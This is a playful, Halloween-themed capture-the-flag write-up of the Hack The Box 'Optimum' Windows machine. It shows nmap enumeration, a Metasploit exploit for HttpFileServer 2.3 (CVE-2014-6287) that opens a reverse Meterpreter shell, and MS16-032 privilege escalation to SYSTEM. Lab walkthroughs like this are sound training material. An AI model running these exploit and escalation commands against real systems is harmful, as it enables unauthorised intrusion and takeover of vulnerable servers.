# HTB_Optimum
My writeup for the HTB machine Optimum!


🎃 HTB Optimum - Spooky Edition 🦇
A Halloween-themed walkthrough for Hack The Box's Optimum machine

Spooky Hacking

👻 Introduction
Welcome, brave hacker, to the Haunted Server of Optimum! This eerie Windows machine hides dark secrets—a vulnerable HttpFileServer (HFS) waiting to unleash its demons. Your mission? Exploit it, escalate privileges, and uncover the ghostly flags hidden in its shadowy depths.

Difficulty: 👻👻👻👻👻 (Easy)
Operating System: Windows (Server 2012 R2)
Author: Lantern
Tools Used: nmap, Metasploit, Exploit-DB

🕵️ Enumeration: Unmasking the Phantom Service
1. Port Scanning with nmap
We start by probing the haunted server with nmap:

```bash
nmap -sV -sC -oA nmap/optimum_spooky 10.10.10.8
```

Findings:

![1 nmap](https://github.com/user-attachments/assets/1a1006f4-680f-4c9f-8035-d2b070f2eb45)


Port 80 (HTTP): A cursed HttpFileServer 2.3 lurks here.

CVE-2014-6287: This version has a Remote Code Execution (RCE) vulnerability—perfect for summoning a reverse shell!


![2 HTTP server](https://github.com/user-attachments/assets/2b55130a-4350-48b9-bcb4-a467927920d7)

💀 Exploitation: Raising the Dead (Shell)
2. Summoning a Meterpreter Shell
We invoke Metasploit to exploit the haunted HFS:

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.10.10.8
set LHOST <YOUR_IP>
exploit
```

![3 initial exploit](https://github.com/user-attachments/assets/b89cc0f6-cee8-47c0-a8e8-129963d12660)


If successful:

A Meterpreter session rises from the digital grave!

Check your access:

```bash
meterpreter > getuid
```

Server username: OPTIMUM\kostas (The Lost User)
3. Collecting the First Soul (User Flag)
Navigate to Kostas’ forsaken desktop and claim the user flag:

```bash
meterpreter > shell
type C:\Users\kostas\Desktop\user.txt
```

👑 Privilege Escalation: Becoming the Lich King (SYSTEM)
4. Checking the Haunted System
Before ascending, we must know our enemy:

```bash
meterpreter > sysinfo
```

# Output: Windows 2012 R2 (6.3 Build 9600) - A cursed relic!
5. Exploiting the Forgotten Curse (MS16-032)
We exploit a secondary logon handle vulnerability to become SYSTEM:

```bash
background
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
set LHOST <YOUR_IP>
exploit
```

![4 upgrade privelages](https://github.com/user-attachments/assets/1a53ba83-8020-4ec9-8999-0cc44411add0)


Success? You are now nt authority\system—the Overlord of Optimum!

6. Claiming the Final Soul (Root Flag)
Enter the Administrator’s lair and seize the root flag:

```bash
shell
type C:\Users\Administrator\Desktop\root.txt
```

![5 root flag](https://github.com/user-attachments/assets/ee591a23-ebcf-4140-b6e0-1bbb7c63073f)


🎃 Conclusion: The Curse is Lifted!
You’ve conquered the haunted Optimum machine! Here’s what we learned:
✔ Exploiting outdated services can open spectral gateways.
✔ Windows privilege escalation is like stealing a lich’s phylactery.
✔ Always check for known CVEs—they’re the ghosts of past mistakes.

🔮 Bonus: Spooky Tips for Future Haunts
Alternative Exploits: If MS16-032 fails, try bypassuac_eventvwr.

Manual Checks:

```bash
whoami /priv           # Check for weak permissions
systeminfo             # Find missing patches
```

🕯️ Final Words
Happy hacking, and beware the ghosts of unpatched systems! 🎃

👻 Want more spooky walkthroughs?
⭐ Star this repo & follow for hauntingly good content!
